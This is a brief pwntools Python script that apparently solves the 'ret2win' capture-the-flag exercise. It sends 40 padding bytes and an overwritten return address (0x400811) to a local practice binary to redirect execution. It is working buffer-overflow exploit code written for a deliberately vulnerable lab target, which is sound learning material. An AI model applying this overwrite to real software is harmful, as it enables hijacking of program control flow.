#!/usr/bin/env python

from pwn import *

p = process("./ret2win")
p.recv(1024)
payload = (
    "\x90" * 40 +
    p64(0x400811)
)
p.sendline(payload)
p.recv(1024)
print(p.recvall())

p.close()
